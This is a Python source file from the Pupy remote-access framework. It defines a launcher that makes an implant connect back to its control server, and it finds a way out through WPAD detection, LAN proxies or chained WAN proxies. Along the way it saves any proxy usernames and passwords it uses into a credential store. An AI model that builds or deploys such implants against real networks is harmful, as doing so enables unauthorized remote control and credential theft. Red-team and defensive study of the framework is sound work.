# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root
# of the project for the detailed licence terms

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
__all__ = ['AutoProxyLauncher']

import argparse

from network.lib.utils import (
    parse_transports_args,
    create_client_transport_info_for_addr,
    parse_host
)

from network.lib.base_launcher import (
    BaseLauncher, LauncherArgumentParser, LauncherError
)

from network.lib.proxies import (
    find_proxies_for_transport, connect_client_with_proxy_info
)

from network.lib.socks import ProxyError
from network.lib.netcreds import add_cred

from network.conf import transports

from . import getLogger

logger = getLogger('auto_proxy')


class AutoProxyLauncher(BaseLauncher):
    '''
    Communicate to server via proxy or chain of proxies
    '''

    name = 'auto_proxy'
    credentials = ['SSL_BIND_CERT']

    __slots__ = (
        'arg_parser', 'args', 'hosts',
        'connect_on_bind_payload', 'opt_args'
    )

    def __init__(self, *args, **kwargs):
        self.connect_on_bind_payload = kwargs.pop('connect_on_bind_payload', False)
        super(AutoProxyLauncher, self).__init__(*args, **kwargs)

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = LauncherArgumentParser(prog="auto_proxy", description=cls.__doc__)
        cls.arg_parser.add_argument(
            '-c', '--host', metavar='<host:port>', required=True, action='append',
            help='host:port of the pupy server to connect to. You can provide multiple '
            '--host arguments to attempt to connect to multiple IPs')
        cls.arg_parser.add_argument(
            '-t', '--transport', choices=transports, default='ssl',
            help='The transport to use')
        cls.arg_parser.add_argument(
            '-P', '--no-wpad', action='store_true', default=False,
            help='Disable WPAD autodetection')
        cls.arg_parser.add_argument(
            '-A', '--no-auto', action='store_true', default=False,
            help='Disable automatic search for proxies')
        cls.arg_parser.add_argument(
            '-D', '--no-direct', action='store_true', default=False,
            help='Do not attempt to connect without a proxy')
        cls.arg_parser.add_argument(
            '-L', '--try-lan-proxy', action='append',
            help='Try to communicate with WAN using sepcified proxy: '
            'TYPE:host:port (SOCKS5:192.168.0.1:1080)')
        cls.arg_parser.add_argument(
            '-W', '--add-wan-proxy', action='append',
            help='Add proxy to chain of proxies to communicate with pupy server: '
            'TYPE:host:port (SOCKS5:192.168.0.1:1080)')
        cls.arg_parser.add_argument(
            'transport_args', nargs=argparse.REMAINDER,
            help='Transport arguments: key=value key=value ...')

    def parse_args(self, args):
        super(AutoProxyLauncher, self).parse_args(args)

        self.opt_args = parse_transports_args(self.args.transport_args)
        self.hosts = [
            parse_host(host) for host in self.args.host
        ]

    def connect_to_host(self, host_info):
        logger.info('connecting to %s:%d (hostname=%s) using transport %s ...',
            host_info.host, host_info.port, host_info.hostname, self.args.transport)

        transport_info = create_client_transport_info_for_addr(
            self.args.transport, host_info,
            self.opt_args, self.connect_on_bind_payload
        )

        logger.info('using client options: %s', transport_info.client_args)
        logger.info('using transports options: %s', transport_info.transport_args)

        proposed_proxy_infos = find_proxies_for_transport(
            transport_info, host_info,
            lan_proxies=self.args.try_lan_proxy,
            wan_proxies=self.args.add_wan_proxy,
            auto=not self.args.no_auto,
            wpad=not self.args.no_wpad,
            direct=not self.args.no_direct
        )

        for proxy_info in proposed_proxy_infos:
            try:
                connection = connect_client_with_proxy_info(
                    transport_info, proxy_info)

                # Add to netcreds
                if proxy_info.chain:
                    for proxy in proxy_info.chain:
                        if not (proxy.username and proxy.password):
                            continue

                        schema = proxy.type.lower()
                        hostname, port = proxy.addr.split(':')
                        add_cred(proxy.username, proxy.password, True, schema, hostname, None, port)

                self.set_connection_info(
                    host_info.hostname, host_info.host,
                    host_info.port, proxy_info.chain,
                    self.args.transport
                )

                yield connection

                self.reset_connection_info()

            except (ProxyError, EOFError) as e:
                logger.info(
                    'Connection to %s:%d using %s failed: %s',
                    host_info.host, host_info.port, proxy_info.chain, e
                )
            except Exception as e:
                logger.exception(e)

    def iterate(self):
        if self.args is None:
            raise LauncherError('parse_args needs to be called before iterate')

        for host_info in self.hosts:
            streams_iterator = self.connect_to_host(host_info)

            while True:
                try:
                    stream = next(streams_iterator)
                    yield stream
                    if not stream.failed:
                        logger.info('Successful attempt')
                        break

                except EOFError as e:
                    logger.info('Connection closed: %s', e)

                except StopIteration:
                    break

                except Exception as e:
                    logger.exception(e)
